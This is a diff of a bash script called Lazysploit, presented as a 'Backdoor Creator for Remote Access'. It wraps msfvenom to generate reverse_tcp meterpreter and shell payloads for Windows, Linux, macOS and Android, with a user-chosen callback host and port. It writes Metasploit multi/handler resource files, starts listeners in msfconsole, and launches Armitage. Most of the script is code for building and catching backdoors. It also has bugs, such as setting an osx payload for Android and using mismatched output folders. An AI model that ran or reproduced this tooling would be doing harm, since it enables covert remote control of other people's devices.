@@ -1,6 +1,8 @@
 #!/bin/bash
 
 #Colour
+orange='\e[38;5;166m'
+BlueF='\e[1;34m'
 cyan='\e[0;36m'
 green='\e[0;32m'
 lightgreen='\e[1;32m'
@@ -9,81 +11,45 @@ red='\e[1;31m'
 yellow='\e[1;33m'
 blue='\e[1;34m'
 purple='\e[1;35m'
-
 [[ `id -u` -eq 0 ]] || { echo -e $red "Must be root to run script"; exit 1; }
-resize -s 30 85
-mkdir ~/Desktop/temp
+resize -s 30 88
+#make the directory
+mkdir ~/Desktop/output
 clear
-echo -e $green"Starting Services......."
-service postgresql start
-service apache2 start
+echo -e "Starting Services......."
+#service postgresql start
+
+#exit funxtion
+function escape() {
+echo -e $cyan"Are you sure to Exit Lazysploit"
+echo -ne $cyan"Choose y/n : "
+read press
+if test $press == 'Y'
+then 
+echo -e $red "Stopping Services......."
+service postgresql stop
+echo -e "Exit....."
+tput sgr0
 clear 
-echo -e $red":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-echo -e $red"::::::::::::::::::::::::::::$blue Metasploit service started $red:::::::::::::::::::::::::::::"
-echo -e $red":::::::::::::::::::$green Scripts and payloads saved to ~/Desktop/temp/ $red:::::::::::::::::::"
-echo -e $red":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-read -p "Press [Enter] key to Continue..."
-clear  
-echo -e "                       ▌   ▞▀▖ ▀▀▌ ▌ ▌ ▞▀▖ ▛▀▖ ▌   ▞▀▖ ▜▘ ▀▛▘"
-echo -e "                       ▌   ▙▄▌  ▞  ▝▞  ▚▄  ▙▄▘ ▌   ▌ ▌ ▐   ▌ "
-echo -e "                       ▌   ▌ ▌ ▞    ▌  ▖ ▌ ▌   ▌   ▌ ▌ ▐   ▌ "
-echo -e "                       ▀▀▘ ▘ ▘ ▀▀▘  ▘  ▝▀  ▘   ▀▀▘ ▝▀  ▀▘  ▘ "
-echo -e 
-echo -e "                $white[$lightgreen--$white]    $white Backdoor Creator for Remote Access     $white[$lightgreen--$white] "
-echo -e "                $white[$lightgreen--$white]         $cyan Created by:$red Soumen Khara          $white[$lightgreen--$white] "
-echo -e "                $white[$lightgreen--$white]       $cyan Follow me on Github:$red @50UM3N        $white[$lightgreen--$white]"
-echo -e "                $white[$lightgreen--$white]         $white SELECT AN OPTION TO BEGIN         $white[$lightgreen--$white]"
-tput sgr0 
-echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-echo -e "    $lightgreen[$red"1"$lightgreen] $lightgreen Payload      $white [Create a payload with msvenom] "
-tput sgr0                               
-echo -e "    $lightgreen[$red"2"$lightgreen] $lightgreen Listen       $white [Start a multi handler] "
+elif test $press == 'N'
+then
+menu
+elif test $press == 'y'
+then 
+echo -e $red"Stopping Services......."
+service postgresql stop
+echo -e "Exit....."
 tput sgr0
-echo -e "    $lightgreen[$red"3"$lightgreen] $lightgreen Exploit      $white [Start Msfconsole] "
-tput sgr0
-echo -e "    $lightgreen[$red"4"$lightgreen] $lightgreen Armitage     $white [Start Armitage GUI] "
-echo -e $lightgreen"┌─["$red"SOUMEN$lightgreen]──[$red~$lightgreen]─[$cyan"menu"$lightgreen]:"	
-echo -ne $lightgreen"└─────► " ;tput sgr0
-
-read options
-
-case "$options" in
-# Note variable is quoted.
-
-  "1" | "1" )
-  # Accept upper or lowercase input.
 clear
-echo -e $lightgreen"  ===================================================================== "
-echo -e " |  $cyan  Create Payload with msfvenom ( must install msfvenom )  $ligitgreen         | "
-echo -e $lightgreen"  ===================================================================== "
-echo -e $red"  ___________ "
-echo -e " |           |======[***   $yellow    ____                _             "
-echo -e $red" | $yellow MSFVENOM $red \ 	     $yellow / ___|_ __ ___  ____| |_ ___  _ __ "
-echo -e $red" |_____________\_______    $yellow  | |   | '__/ _ \/ _  | __/ _ \| '__|"
-echo -e $red" |==[     >]===========\   $yellow  | |___| | |  __/ (_| | || (_) | |   "
-echo -e $red" |______________________\  $yellow   \____|_|  \___|\____|\__\___/|_|    "
-echo -e $yellow"  \(@)(@)(@)(@)(@)(@)(@)/ "
-echo -e $red"  *********************  "
-echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-echo -e "    $lightgreen[$red"1"$lightgreen] $lightgreen Windows      $white [laxysploit.exe] "
-tput sgr0                               # Reset colors to "normal."
-echo -e "    $lightgreen[$red"2"$lightgreen] $lightgreen Linux        $white [lazysploit.elf] "
-tput sgr0
-echo -e "    $lightgreen[$red"3"$lightgreen] $lightgreen Mac          $white [lazysploit.macho] "
-tput sgr0
-echo -e "    $lightgreen[$red"4"$lightgreen] $lightgreen Android      $white [lazysploit.apk]"
-tput sgr0
-echo -e "    $lightgreen[$red"5"$lightgreen] $lightgreen List_All     $white [Start MSFConsole] "
-tput sgr0
-echo -e "    $lightgreen[$red"6"$lightgreen] $lightgreen Quit         $white [Exit The Tool] "
-echo -e $lightgreen"┌─["$red"SOUMEN$lightgreen]──[$red~$lightgreen]─["$cyan"msfvenom$lightgreen]:"	
-echo -ne $lightgreen"└─────► " ;tput sgr0
+elif test $press == 'n'
+then
+menu
+fi
+}
 
-read options
-
-    case "$options" in
-       "1" | "1" )
-clear
+#banner
+function windows() {
+tput sgr0
 echo -e $lightgreen"[]===============================================[]"
 echo -e $lightgreen"[] $blue __        ___           _                    $lightgreen[]"
 echo -e $lightgreen"[] $blue \ \      / (_)_ __   __| | _____      _____  $lightgreen[]"
@@ -91,50 +57,14 @@ echo -e $lightgreen"[] $blue  \ \ /\ / /| | '_ \ / _| |/ _ \ \ /\ / / __| $light
 echo -e $lightgreen"[] $blue   \ V  V / | | | | | (_| | (_) \ V  V /\__ \ $lightgreen[]"
 echo -e $lightgreen"[] $blue    \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/ $lightgreen[]"
 echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[]       $red Create a Payload for WINDOWS           $lightgreen[]"
+echo -e $lightgreen"[]       $red Create a $sub for WINDOWS           $lightgreen[]"
 echo -e $lightgreen"[]===============================================[]"
 tput sgr0
-echo -e $blue ""                                            
-            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
-            echo -e "$yellow:::::$red shell.exe saved to ~/Desktop/temp$yellow:::::"
-            ;;
-       "2" | "2" )
-clear
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[] $blue  _     _                                     $lightgreen[]"
-echo -e $lightgreen"[] $blue | |   (_)_ __  _   ___  __                   $lightgreen[]"
-echo -e $lightgreen"[] $blue | |   | | '_ \| | | \ \/ /                   $lightgreen[]"
-echo -e $lightgreen"[] $blue | |___| | | | | |_| |>  <                    $lightgreen[]"
-echo -e $lightgreen"[] $blue |_____|_|_| |_|\__,_/_/\_\                   $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[]       $red Create a Payload for LINUX             $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
+}
+
+#banner
+function android(){
 tput sgr0
-echo -e $blue "" 
-            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
-            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
-            echo -e "$yellow:::::$red shell.elf saved to ~/Desktop/temp$yellow:::::"
-            ;;
-       "3" | "3" )
-clear
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[] $blue  __  __                                      $lightgreen[]"
-echo -e $lightgreen"[] $blue |  \/  | __ _  ___                           $lightgreen[]"
-echo -e $lightgreen"[] $blue | |\/| |/ _' |/ __|                          $lightgreen[]"
-echo -e $lightgreen"[] $blue | |  | | (_| | (__                           $lightgreen[]"
-echo -e $lightgreen"[] $blue |_|  |_|\__,_|\___|                          $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[]       $red Create a Payload for  MAC              $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
-tput sgr0
-echo -e $blue "" 
-            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
-            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
-            echo -e "$yellow:::::$red shell.macho saved to ~/Desktop/temp$yellow:::::"
-            ;;
-       "4" | "4" )
-clear
 echo -e $lightgreen"[]===============================================[]"
 echo -e $lightgreen"[] $blue     _              _           _     _       $lightgreen[]"
 echo -e $lightgreen"[] $blue    / \   _ __   __| |_ __ ___ (_) __| |      $lightgreen[]"
@@ -145,22 +75,124 @@ echo -e $lightgreen"[]===============================================[]"
 echo -e $lightgreen"[]       $red Create a Payload for  ANDROID          $lightgreen[]"
 echo -e $lightgreen"[]===============================================[]"
 tput sgr0
-echo -e $blue "" 
+}
+
+#banner
+function mac(){
+tput sgr0
+echo -e $lightgreen"[]===============================================[]"
+echo -e $lightgreen"[] $blue  __  __                                      $lightgreen[]"
+echo -e $lightgreen"[] $blue |  \/  | __ _  ___                           $lightgreen[]"
+echo -e $lightgreen"[] $blue | |\/| |/ _' |/ __|                          $lightgreen[]"
+echo -e $lightgreen"[] $blue | |  | | (_| | (__                           $lightgreen[]"
+echo -e $lightgreen"[] $blue |_|  |_|\__,_|\___|                          $lightgreen[]"
+echo -e $lightgreen"[]===============================================[]"
+echo -e $lightgreen"[]       $red Create a Payload for  MAC              $lightgreen[]"
+echo -e $lightgreen"[]===============================================[]"
+tput sgr0
+}
+
+#banner
+function linux(){
+tput sgr0
+echo -e $lightgreen"[]===============================================[]"
+echo -e $lightgreen"[] $blue  _     _                                     $lightgreen[]"
+echo -e $lightgreen"[] $blue | |   (_)_ __  _   ___  __                   $lightgreen[]"
+echo -e $lightgreen"[] $blue | |   | | '_ \| | | \ \/ /                   $lightgreen[]"
+echo -e $lightgreen"[] $blue | |___| | | | | |_| |>  <                    $lightgreen[]"
+echo -e $lightgreen"[] $blue |_____|_|_| |_|\__,_/_/\_\                   $lightgreen[]"
+echo -e $lightgreen"[]===============================================[]"
+echo -e $lightgreen"[]       $red Create a Payload for LINUX             $lightgreen[]"
+echo -e $lightgreen"[]===============================================[]"
+tput sgr0
+}
+
+###################################################################
+# MSFVWNOM MENU                                                   #
+###################################################################
+function creator() {
+clear
+tput sgr0
+echo -e $lightgreen"  ======================================================================== "
+echo -e " |  $cyan  Create Payload with msfvenom ( must install msfvenom )  $ligitgreen         | "
+echo -e $lightgreen"  ======================================================================== "
+echo -e $red"  ___________ "
+echo -e " |           |======[***   $yellow    ____                _             "
+echo -e $red" | $yellow MSFVENOM $red \ 	     $yellow / ___|_ __ ___  ____| |_ ___  _ __ "
+echo -e $red" |_____________\_______    $yellow  | |   | '__/ _ \/ _  | __/ _ \| '__|"
+echo -e $red" |==[     >]===========\   $yellow  | |___| | |  __/ (_| | || (_) | |   "
+echo -e $red" |______________________\  $yellow   \____|_|  \___|\____|\__\___/|_|    "
+echo -e $yellow"  \(@)(@)(@)(@)(@)(@)(@)/ "
+echo -e $red"  *********************  "
+echo -e "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
+echo -e "    $lightgreen[$red"1"$lightgreen] $white Windows       [laxysploit.exe] "
+tput sgr0                               
+echo -e "    $lightgreen[$red"2"$lightgreen] $white Linux         [lazysploit.elf] "
+tput sgr0
+echo -e "    $lightgreen[$red"3"$lightgreen] $white Mac           [lazysploit.macho] "
+tput sgr0
+echo -e "    $lightgreen[$red"4"$lightgreen] $white Android       [lazysploit.apk]"
+tput sgr0
+echo -e "    $lightgreen[$red"5"$lightgreen] $white List_All      [Start MSFConsole] "
+tput sgr0
+echo -e "    $lightgreen[$red"6"$lightgreen] $white Back          [Back From Menu] "
+echo -e $lightgreen"┌─["$red"SOUMEN$lightgreen]──[$red~$lightgreen]─["$cyan"msfvenom$lightgreen]:"	
+echo -ne $lightgreen"└─────► " ;tput sgr0
+
+read options
+ case "$options" in
+    "1" | "1" )
+     clear
+     sub='payload'
+     windows
+     echo -e $white ""                                            
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
+            echo -e "$yellow:::::$red shell.exe saved to ~/Desktop/temp$yellow:::::"
+            echo -ne "Press [ENTER] key to return to menu ."
+     read cont
+     creator
+            ;;
+    "2" | "2" )
+     clear
+     linux
+     echo -e $white "" 
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
+            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
+            echo -e "$yellow:::::$red shell.elf saved to ~/Desktop/temp$yellow:::::"
+            ;;
+    "3" | "3" )
+     clear
+     mac
+     echo -e $white "" 
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
+            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
+            echo -e "$yellow:::::$red shell.macho saved to ~/Desktop/temp$yellow:::::"
+            ;;
+    "4" | "4" )
+     clear
+     android
+     echo -e $white "" 
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
-            echo -e "$yellow:::::$red shell.apk saved to ~/Desktop/temp$yellow:::::"
+     echo -e "$yellow:::::$red shell.apk saved to ~/Desktop/temp$yellow:::::"
             ;;  
-       "5" | "5" )
+    "5" | "5" )
             xterm -e msvenom -l &
             ;;  
-       "6" | "6" )
-            echo "Good Bye" && break 
+    "6" | "6" )
+     menu 
             ;;
-        *) echo invalid option;;
-    esac
-;;
+    *) 
+     echo invalid option;;
+ esac
+}
 
-  "2" | "2" )
+###################################################################
+# LISTNER MENU                                                    #
+###################################################################
+function listner() {
+tput sgr0
 clear
 echo -e $lightgreen"[]==============================================[]"
 echo -e $lightgreen"[] $blue  _     ___ ____ _____ _   _ _____ ____      $lightgreen[]"
@@ -172,27 +204,23 @@ echo -e $lightgreen"[]                                              []"
 echo -e $lightgreen"[]==============================================[]"
 echo -e $lightgreen"[]   $red Lets Craft a Listner for Exploit          $lightgreen[]"
 echo -e $lightgreen"[]==============================================[]"
+tput sgr0
+echo -e "    $red[$lightgreen"1"$red]$white Windows"
+echo -e "    $red[$lightgreen"2"$red]$white Linux"
+echo -e "    $red[$lightgreen"3"$red]$white Mac"
+echo -e "    $red[$lightgreen"4"$red]$white Android"
+echo -e "    $red[$lightgreen"5"$red]$white List_All"
+echo -e "    $red[$lightgreen"6"$red]$white Back"
 PS3='┌─[SOUMEN]─[creator]
 └─────► '
-echo -e $blue""
-options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
-select opt in "${options[@]}"
-do
-    case $opt in
-        "Windows")
-clear
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[] $blue __        ___           _                    $lightgreen[]"
-echo -e $lightgreen"[] $blue \ \      / (_)_ __   __| | _____      _____  $lightgreen[]"
-echo -e $lightgreen"[] $blue  \ \ /\ / /| | '_ \ / _| |/ _ \ \ /\ / / __| $lightgreen[]"
-echo -e $lightgreen"[] $blue   \ V  V / | | | | | (_| | (_) \ V  V /\__ \ $lightgreen[]"
-echo -e $lightgreen"[] $blue    \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/ $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[]       $red Create a Listner for WINDOWS           $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
-tput sgr0
-echo -e $blue ""                                             
 
+read options
+ case "$options" in
+    "1" | "1" )
+     clear
+     sub='listner'
+     windows
+     echo -e $white ""                                             
             touch ~/Desktop/temp/meterpreter.rc
             echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
             echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter.rc
@@ -204,20 +232,14 @@ echo -e $blue ""
             echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
             cat ~/Desktop/temp/meterpreter.rc
             xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
+            echo -ne "Press [ENTER] key to return to menu ."
+            read cont
+            listner
             ;;
-        "Linux")
-clear
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[] $blue  _     _                                     $lightgreen[]"
-echo -e $lightgreen"[] $blue | |   (_)_ __  _   ___  __                   $lightgreen[]"
-echo -e $lightgreen"[] $blue | |   | | '_ \| | | \ \/ /                   $lightgreen[]"
-echo -e $lightgreen"[] $blue | |___| | | | | |_| |>  <                    $lightgreen[]"
-echo -e $lightgreen"[] $blue |_____|_|_| |_|\__,_/_/\_\                   $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[]       $red Create a Listner for LINUX             $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
-tput sgr0
-echo -e $blue "" 
+    "2" | "2" )
+     clear
+     linux
+     echo -e $white "" 
             touch ~/Desktop/temp/meterpreter_linux.rc
             echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_linux.rc
             echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter_linux.rc
@@ -231,19 +253,10 @@ echo -e $blue ""
             xterm -e msfconsole -r ~/Desktop/temp/meterpreter_linux.rc &
             exit
             ;;
-        "Mac")
-clear
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[] $blue  __  __                                      $lightgreen[]"
-echo -e $lightgreen"[] $blue |  \/  | __ _  ___                           $lightgreen[]"
-echo -e $lightgreen"[] $blue | |\/| |/ _' |/ __|                          $lightgreen[]"
-echo -e $lightgreen"[] $blue | |  | | (_| | (__                           $lightgreen[]"
-echo -e $lightgreen"[] $blue |_|  |_|\__,_|\___|                          $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[]       $red Create a Listner for  MAC              $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
-tput sgr0
-echo -e $blue "" 
+    "3" | "3" )
+     clear
+     mac
+     echo -e $white "" 
             touch ~/Desktop/temp/meterpreter_mac.rc
             echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_mac.rc
             echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_mac.rc
@@ -256,19 +269,10 @@ echo -e $blue ""
             cat ~/Desktop/temp/meterpreter_mac.rc
             xterm -e msfconsole -r ~/Desktop/temp/meterpreter_mac.rc &
             ;;
-        "Android")
-clear
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[] $blue     _              _           _     _       $lightgreen[]"
-echo -e $lightgreen"[] $blue    / \   _ __   __| |_ __ ___ (_) __| |      $lightgreen[]"
-echo -e $lightgreen"[] $blue   / _ \ | '_ \ / _' | '__/ _ \| |/ _' |      $lightgreen[]"
-echo -e $lightgreen"[] $blue  / ___ \| | | | (_| | | | (_) | | (_| |      $lightgreen[]"
-echo -e $lightgreen"[] $blue /_/   \_\_| |_|\__,_|_|  \___/|_|\__,_|      $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
-echo -e $lightgreen"[]       $red Create a Listner for  ANDROID          $lightgreen[]"
-echo -e $lightgreen"[]===============================================[]"
-tput sgr0
-echo -e $blue "" 
+    "4" | "4" ) 
+     clear
+     android
+     echo -e $white "" 
             touch ~/Desktop/temp/meterpreter_droid.rc
             echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_droid.rc
             echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_droid.rc
@@ -281,48 +285,136 @@ echo -e $blue ""
             cat ~/Desktop/temp/meterpreter_droid.rc
             xterm -e msfconsole -r ~/Desktop/temp/meterpreter_droid.rc &
             ;;  
-        "List_All")
+    "5" | "5" )
             touch ~/Desktop/temp/payloads.rc
             echo show payloads > ~/Desktop/temp/payloads.rc
             cat ~/Desktop/temp/payloads.rc
             xterm -e msfconsole -r ~/Desktop/temp/payloads.rc &
             ;;   
-        "Quit")
-               echo "Good Bye" && break 
+    "6" | "6" )
+     menu
             ;;
-        *) echo invalid option;;
-    esac
-done
-;;
+    *)
+      echo invalid option
+            ;;
+ esac
+}
 
- "3" | "3" )
-  # Accept upper or lowercase input.
-  echo -e "$red::::::::::::::::::::::::::::::::$white Starting Metasploit $red:::::::::::::::::::::::::::::::"
-  msfconsole
-  use exploit/multi/handler  
+###################################################################
+# MENU FUNCTION                                                   #
+###################################################################
+function menu(){
+clear
+tput sgr0  
+echo -e "  ╔═════════════════════════════════════════════════════════════════════════════════╗"
+echo -e "  $white║  $red██$cyan╗      $red█████$cyan╗ $red███████$cyan╗$red██$cyan╗   $red██$cyan╗$red███████$cyan╗$red██████$cyan╗ $red██$cyan╗      $red██████$cyan╗ $red██$cyan╗$red████████$cyan╗ $white║"
+echo -e "  $white║  $red██$cyan║     $red██$cyan╔══$red██$cyan╗╚══$red███$cyan╔╝╚$red██$cyan╗ $red██$cyan╔╝$red██$cyan╔════╝$red██$cyan╔══$red██$cyan╗$red██$cyan║     $red██$cyan╔═══$red██$cyan╗$red██$cyan║╚══$red██$cyan╔══╝ $white║"
+echo -e "  $white║  $red██$cyan║     $red███████$cyan║  $red███$cyan╔╝  ╚$red████$cyan╔╝ $red███████$cyan╗$red██████$cyan╔╝$red██$cyan║     $red██$cyan║   $red██$cyan║$red██$cyan║   $red██$cyan║    $white║"
+echo -e "  $white║  $red██$cyan║     $red██$cyan╔══$red██$cyan║ $red███$cyan╔╝    ╚$red██$cyan╔╝  ╚════$red██$cyan║$red██$cyan╔═══╝ $red██$cyan║     $red██$cyan║   $red██$cyan║$red██$cyan║   $red██$cyan║    $white║"
+echo -e "  $white║  $red███████$cyan╗$red██$cyan║  $red██$cyan║$red███████$cyan╗   $red██$cyan║   $red███████$cyan║$red██$cyan║     $red███████$cyan╗╚$red██████$cyan╔╝$red██$cyan║   $red$red██$cyan║    $white║"
+echo -e "  $white║  $cyan╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝    $white║"
+echo -e "  $white╚═════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "                $white[$lightgreen--$white]    $white Backdoor Creator for Remote Access     $white[$lightgreen--$white] "
+echo -e "                $white[$lightgreen--$white]         $cyan Created by:$red Soumen Khara          $white[$lightgreen--$white] "
+echo -e "                $white[$lightgreen--$white]       $cyan Follow me on Github:$red @50UM3N        $white[$lightgreen--$white]"
+echo -e "                $white[$lightgreen--$white]         $white SELECT AN OPTION TO BEGIN         $white[$lightgreen--$white]"
+tput sgr0 
+echo -e "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
+echo -e "    $lightgreen[$red"1"$lightgreen] $lightgreen Payload      $white [Create a payload with msvenom] "
+tput sgr0                               
+echo -e "    $lightgreen[$red"2"$lightgreen] $lightgreen Listen       $white [Start a multi handler] "
+tput sgr0
+echo -e "    $lightgreen[$red"3"$lightgreen] $lightgreen Exploit      $white [Start Msfconsole] "
+tput sgr0
+echo -e "    $lightgreen[$red"4"$lightgreen] $lightgreen Armitage     $white [Start Armitage GUI] "
+tput sgr0
+echo -e "    $lightgreen[$red"5"$lightgreen] $lightgreen Exit         $white [Exit from Lazysploit] "
+echo -e $lightgreen"┌─["$red"SOUMEN$lightgreen]──[$red~$lightgreen]─[$cyan"menu"$lightgreen]:"  
+echo -ne $lightgreen"└─────► " ;tput sgr0
 
-;;
+read options
+ case "$options" in
+    "1" | "1" )
+      creator
+      ;;
+    "2" | "2" )
+      listner
+      ;;
+    "3" | "3" )
+     echo -e "$red::::::::::::::::::::::::::::::::$white Starting Metasploit $red::::::::::::::::::::::::::::::::::"
+      msfconsole
+      use exploit/multi/handler  
+      ;;
+    "4" | "4" )
+      echo -e "$red::::::::::::::::::::::::::::::::$white Armitage Launching $red::::::::::::::::::::::::::::::::::"
+      echo "armitage should be in /opt/armitage"
+      echo -e "$red::::::::::::::::::::::::::::::::::: $white Launching... $red::::::::::::::::::::::::::::::::::::::"
+      xterm -e sudo java -jar /opt/armitage/armitage.jar & 
+      ;;
+    "5" | "5" )
+      escape
+      ;;
+    * )
+      echo -e invalide option
+      ;; 
+ esac
+}
 
-  "4" | "4" )
-  # 
-  echo -e "$red::::::::::::::::::::::::::::::::$white Armitage Launching $red:::::::::::::::::::::::::::::::"
-  echo "armitage should be in /opt/armitage"
-  echo -e "$red::::::::::::::::::::::::::::::::::: $white Launching... $red:::::::::::::::::::::::::::::::::::"
-  xterm -e sudo java -jar /opt/armitage/armitage.jar & 
+###################################################################
+# MENU                                                            #
+###################################################################
+clear
+tput sgr0  
+echo -e "  ╔═════════════════════════════════════════════════════════════════════════════════╗"
+echo -e "  $white║  $red██$cyan╗      $red█████$cyan╗ $red███████$cyan╗$red██$cyan╗   $red██$cyan╗$red███████$cyan╗$red██████$cyan╗ $red██$cyan╗      $red██████$cyan╗ $red██$cyan╗$red████████$cyan╗ $white║"
+echo -e "  $white║  $red██$cyan║     $red██$cyan╔══$red██$cyan╗╚══$red███$cyan╔╝╚$red██$cyan╗ $red██$cyan╔╝$red██$cyan╔════╝$red██$cyan╔══$red██$cyan╗$red██$cyan║     $red██$cyan╔═══$red██$cyan╗$red██$cyan║╚══$red██$cyan╔══╝ $white║"
+echo -e "  $white║  $red██$cyan║     $red███████$cyan║  $red███$cyan╔╝  ╚$red████$cyan╔╝ $red███████$cyan╗$red██████$cyan╔╝$red██$cyan║     $red██$cyan║   $red██$cyan║$red██$cyan║   $red██$cyan║    $white║"
+echo -e "  $white║  $red██$cyan║     $red██$cyan╔══$red██$cyan║ $red███$cyan╔╝    ╚$red██$cyan╔╝  ╚════$red██$cyan║$red██$cyan╔═══╝ $red██$cyan║     $red██$cyan║   $red██$cyan║$red██$cyan║   $red██$cyan║    $white║"
+echo -e "  $white║  $red███████$cyan╗$red██$cyan║  $red██$cyan║$red███████$cyan╗   $red██$cyan║   $red███████$cyan║$red██$cyan║     $red███████$cyan╗╚$red██████$cyan╔╝$red██$cyan║   $red$red██$cyan║    $white║"
+echo -e "  $white║  $cyan╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝    $white║"
+echo -e "  $white╚═════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "                $white[$lightgreen--$white]    $white Backdoor Creator for Remote Access     $white[$lightgreen--$white] "
+echo -e "                $white[$lightgreen--$white]         $cyan Created by:$red Soumen Khara          $white[$lightgreen--$white] "
+echo -e "                $white[$lightgreen--$white]       $cyan Follow me on Github:$red @50UM3N        $white[$lightgreen--$white]"
+echo -e "                $white[$lightgreen--$white]         $white SELECT AN OPTION TO BEGIN         $white[$lightgreen--$white]"
+tput sgr0 
+echo -e "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
+echo -e "    $lightgreen[$red"1"$lightgreen] $lightgreen Payload      $white [Create a payload with msvenom] "
+tput sgr0                               
+echo -e "    $lightgreen[$red"2"$lightgreen] $lightgreen Listen       $white [Start a multi handler] "
+tput sgr0
+echo -e "    $lightgreen[$red"3"$lightgreen] $lightgreen Exploit      $white [Start Msfconsole] "
+tput sgr0
+echo -e "    $lightgreen[$red"4"$lightgreen] $lightgreen Armitage     $white [Start Armitage GUI] "
+tput sgr0
+echo -e "    $lightgreen[$red"5"$lightgreen] $lightgreen Exit         $white [Exit from Lazysploit] "
+echo -e $lightgreen"┌─["$red"SOUMEN$lightgreen]──[$red~$lightgreen]─[$cyan"menu"$lightgreen]:"  
+echo -ne $lightgreen"└─────► " ;tput sgr0
 
-;;
+read options
+ case "$options" in
+    "1" | "1" )
+      creator
+      ;;
+    "2" | "2" )
+      listner
+      ;;
+    "3" | "3" )
+     echo -e "$red::::::::::::::::::::::::::::::::$white Starting Metasploit $red::::::::::::::::::::::::::::::::::"
+      msfconsole
+      use exploit/multi/handler  
+      ;;
+    "4" | "4" )
+      echo -e "$red::::::::::::::::::::::::::::::::$white Armitage Launching $red::::::::::::::::::::::::::::::::::"
+      echo "armitage should be in /opt/armitage"
+      echo -e "$red::::::::::::::::::::::::::::::::::: $white Launching... $red::::::::::::::::::::::::::::::::::::::"
+      xterm -e sudo java -jar /opt/armitage/armitage.jar & 
+      ;;
+    "5" | "5" )
+      escape
+      ;;
+    * )
+      echo -e invalide option
+      ;; 
+ esac
 
-          * )
-   # Default option.      
-   # 
-   echo
-   echo "Not yet in database."
-  ;;
-
-esac
-
-tput sgr0                               # Reset colors to "normal."
-
-echo
-
-exit 0
